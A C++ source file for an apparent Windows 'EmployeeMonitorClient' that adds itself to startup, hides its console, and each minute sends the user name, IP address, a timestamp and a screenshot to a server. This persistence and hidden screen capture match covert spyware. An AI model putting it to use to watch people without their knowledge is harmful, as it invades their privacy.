#include "App.h"

ULONG_PTR gdiplusToken;

void App::Run() {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    std::wstring exePath = GetExecutablePath() + L"\\..\\EmployeeMonitorClient\\x64\\Debug\\EmployeeMonitorClient.exe";
    RegistryManager::AddToStartup(exePath);
    HideConsole();

    std::thread monitorThread(MonitorAndSendData);
    monitorThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
}

std::wstring App::GetExecutablePath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

void App::HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

void App::MonitorAndSendData() {
    std::wstring user = UserInfo::GetCurrentUserName();
    std::wstring ip = NetworkUtils::GetIPAddress();

    while (true) {
        if (ActivityMonitor::IsUserActive()) {
            std::wstring currentTime = TimeUtils::FetchCurrentTime();
            std::wstring data = L"{\"user\":\"" + user + L"\",\"ip\":\"" + ip + L"\",\"lastActive\":\"" + currentTime + L"\"}";

            std::vector<BYTE> screenshotBuffer;
            ScreenshotCapture::CaptureScreenshot(screenshotBuffer);

            DataSender::SendDataToServer(data, screenshotBuffer);
        }
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}
